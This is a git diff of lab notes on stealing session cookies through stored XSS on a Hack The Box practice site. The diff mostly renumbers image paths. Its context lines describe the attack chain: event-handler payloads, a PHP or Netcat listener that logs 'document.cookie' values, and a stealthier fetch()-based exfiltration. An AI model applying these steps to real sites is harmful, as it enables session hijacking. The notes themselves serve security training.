@@ -7,7 +7,7 @@ Navigate to `http://xss.htb.net` and log in to the application using the credent
 
 This is an account that we created to look at the application's functionality. It looks like we can edit the input fields to update our email, phone number, and country.
 
-<figure><img src="../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>
 
 In such cases, it is best to use payloads with event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like `onmouseover`.
 
@@ -31,11 +31,11 @@ In the remaining two fields, let us specify the following two payloads.
 
 We will need to update the profile by pressing "Save" to submit our payloads.
 
-<figure><img src="../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1149).png" alt=""><figcaption></figcaption></figure>
 
 Let us now check if _HTTPOnly_ is "off" using Web Developer Tools.
 
-<figure><img src="../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>
 
 ## Obtaining session cookies through XSS
 
@@ -43,7 +43,7 @@ This script waits for anyone to request `?c=+document.cookie`, and it will then 
 
 The cookie-logging script can be run as follows. `TUN Adapter IP` is the `tun` interface's IP of either Pwnbox or your own VM.
 
-&#x20; Cross-Site Scripting (XSS)
+Cross-Site Scripting (XSS)
 
 ```shell-session
 eldeim@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
@@ -81,11 +81,11 @@ Now, navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com`. Thi
 
 You should now see the below in your attacking machine.
 
-<figure><img src="../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>
 
 Terminate the PHP server with Ctrl+c, and the victim's cookie will reside inside `cookieLog.txt`
 
-<figure><img src="../../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>
 
 ## Obtaining session cookies via XSS (Netcat edition)
 
@@ -106,15 +106,15 @@ Open a `New Private Window` and navigate to `http://xss.htb.net/profile?email=el
 
 By the time you hold your mouse over "test," you should now see the below in your attacking machine.
 
-<figure><img src="../../../.gitbook/assets/image (30) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (687).png" alt=""><figcaption></figcaption></figure>
 
 Please note that the cookie is a Base64 value because we used the `btoa()` function, which will base64 encode the cookie's value. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools, as follows.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (688).png" alt=""><figcaption></figcaption></figure>
 
 You can now use this stolen cookie to hijack the victim's session!
 
-We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.&#x20;
+We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.
 
 Find an example of such a payload below.
 
